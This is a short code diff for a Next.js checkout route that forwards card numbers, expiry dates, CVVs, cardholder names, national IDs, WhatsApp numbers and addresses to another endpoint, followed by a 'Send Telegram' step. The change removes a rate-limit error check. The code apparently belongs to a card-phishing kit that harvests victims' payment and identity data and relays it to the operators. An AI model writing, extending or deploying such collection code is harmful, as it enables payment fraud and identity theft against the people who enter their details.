@@ -25,10 +25,6 @@ export async function POST(req: NextRequest) {
       headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
-    if (dbRes.status === 429) {
-      const errData = await dbRes.json().catch(() => ({}));
-      return NextResponse.json({ ok: false, error: errData.error }, { status: 429 });
-    }
   } catch {}
 
   // Send Telegram
